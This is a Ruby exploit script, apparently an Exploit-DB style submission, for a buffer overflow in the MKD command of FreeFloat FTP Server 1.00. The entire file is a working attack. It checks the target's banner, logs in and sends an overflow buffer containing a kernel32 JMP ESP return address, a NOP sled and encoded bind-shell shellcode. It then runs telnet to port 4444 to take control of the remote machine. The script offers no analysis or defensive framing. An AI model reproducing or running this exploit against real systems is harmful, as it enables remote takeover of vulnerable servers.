#!/usr/bin/ruby
#
#[+]Exploit Title: FreeFloat FTP Server MKD Buffer Overflow Exploit
#[+]Date: 16\06\2011
#[+]Author: C4SS!0 G0M3S
#[+]Software Link: http://www.freefloat.com/software/freefloatftpserver.zip
#[+]Version: 1.00
#[+]Tested On: Windows XP SP3 Brazilian
#[+]CVE: N/A
#
#

require 'socket'


def banner()
 print """
	 
          =================================================================
          =================================================================
          ==========FreeFloat FTP Server MKD Buffer Overflow Exploit=======
          ==========Autor C4SS!0 G0M3S=====================================
          ==========E-mail louredo_@hotmail.com============================
          =================================================================
          =================================================================

"""
end
def exploit(buf,ip,porta)
begin
s = TCPSocket.new(ip,porta.to_i)
s.recv(20000)
s.puts "USER test\r\n"
s.recv(2000)
s.puts "PASS test\r\n"
s.recv(2000)
s.puts "MKD #{buf}\r\n"
s.close
s = TCPSocket.new(ip,porta)
sleep(1)
s.close
rescue
print "\t\t[*]Error: #{$!}\n"
exit(0)
end
end
sys = `ver`
if sys=~/Windows/
	system("cls")
	system("color 4f")
	system("title FreeFloat FTP Server MKD Buffer Overflow Exploit")
else
	system("clear")
end
if not ARGV[1]
 banner()
 print "\t\t[-]Usage: ruby #{$0} <Host> <Port>\n"
 print "\t\t[-]Exemple: ruby #{$0} 192.168.1.2 21\n"
 exit(0)
end
banner()
host = ARGV[0]
porta = ARGV[1].to_i
print "\t\t[+]Connecting to Server "+host+"...\n\n"
sleep(1)
begin
sock = TCPSocket.new(host,porta)
print "\t\t[+]Checking if server is vulnerable\n\n"
sleep(1)
c = sock.recv(2000)
rescue
print "\t\t[*]Error:#{$!}\n"
exit(0)
end

unless c =~/FreeFloat Ftp Server \(Version 1\.00\)/
print "\t\t[+]Server Not Vulnerable:(\n"
sleep(1)
exit(0)
end
sock.close
print "\t\t[+]Server Vulnerable:)\n\n"
sleep(1)
print "\t\t[+]Running Buffer Overflow Attacks\n\n"
sleep(1)

shellcode = 
"\x33\xc9\x83\xe9\xaa\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"+
"\xbb\xc1\x9c\x35\x83\xee\xfc\xe2\xf4\x47\x29\x15\x35\xbb\xc1"+
"\xfc\xbc\x5e\xf0\x4e\x51\x30\x93\xac\xbe\xe9\xcd\x17\x67\xaf"+
"\x4a\xee\x1d\xb4\x76\xd6\x13\x8a\x3e\xad\xf5\x17\xfd\xfd\x49"+
"\xb9\xed\xbc\xf4\x74\xcc\x9d\xf2\x59\x31\xce\x62\x30\x93\x8c"+
"\xbe\xf9\xfd\x9d\xe5\x30\x81\xe4\xb0\x7b\xb5\xd6\x34\x6b\x91"+
"\x17\x7d\xa3\x4a\xc4\x15\xba\x12\x7f\x09\xf2\x4a\xa8\xbe\xba"+
"\x17\xad\xca\x8a\x01\x30\xf4\x74\xcc\x9d\xf2\x83\x21\xe9\xc1"+
"\xb8\xbc\x64\x0e\xc6\xe5\xe9\xd7\xe3\x4a\xc4\x11\xba\x12\xfa"+#Shellcode Bing Shell LPORT=4444
"\xbe\xb7\x8a\x17\x6d\xa7\xc0\x4f\xbe\xbf\x4a\x9d\xe5\x32\x85"+
"\xb8\x11\xe0\x9a\xfd\x6c\xe1\x90\x63\xd5\xe3\x9e\xc6\xbe\xa9"+
"\x2a\x1a\x68\xd3\xf2\xae\x35\xbb\xa9\xeb\x46\x89\x9e\xc8\x5d"+
"\xf7\xb6\xba\x32\x44\x14\x24\xa5\xba\xc1\x9c\x1c\x7f\x95\xcc"+
"\x5d\x92\x41\xf7\x35\x44\x14\xcc\x65\xeb\x91\xdc\x65\xfb\x91"+
"\xf4\xdf\xb4\x1e\x7c\xca\x6e\x48\x5b\x04\x60\x92\xf4\x37\xbb"+
"\xd0\xc0\xbc\x5d\xab\x8c\x63\xec\xa9\x5e\xee\x8c\xa6\x63\xe0"+
"\xe8\x96\xf4\x82\x52\xf9\x63\xca\x6e\x92\xcf\x62\xd3\xb5\x70"+
"\x0e\x5a\x3e\x49\x62\x32\x06\xf4\x40\xd5\x8c\xfd\xca\x6e\xa9"+
"\xff\x58\xdf\xc1\x15\xd6\xec\x96\xcb\x04\x4d\xab\x8e\x6c\xed"+
"\x23\x61\x53\x7c\x85\xb8\x09\xba\xc0\x11\x71\x9f\xd1\x5a\x35"+
"\xff\x95\xcc\x63\xed\x97\xda\x63\xf5\x97\xca\x66\xed\xa9\xe5"+
"\xf9\x84\x47\x63\xe0\x32\x21\xd2\x63\xfd\x3e\xac\x5d\xb3\x46"+
"\x81\x55\x44\x14\x27\xc5\x0e\x63\xca\x5d\x1d\x54\x21\xa8\x44"+
"\x14\xa0\x33\xc7\xcb\x1c\xce\x5b\xb4\x99\x8e\xfc\xd2\xee\x5a"+
"\xd1\xc1\xcf\xca\x6e\xc1\x9c\x35"

buf = "\x41" * 247
buf += [0x7C874413].pack('V')#JMP ESP IN kernel32.dll
buf += "\x90" * 20#nopled
buf += shellcode


buf += "\x41" * (1000-buf.length)
exploit(buf,host,porta)
print "\t\t[+]Attack Buffer Overflow Successfully Executed\n\n"
sleep(1)
print "\t\t[+]Running telnet command: \"telnet #{host} 4444\"\n\n"
sleep(2)
system("telnet #{host} 4444")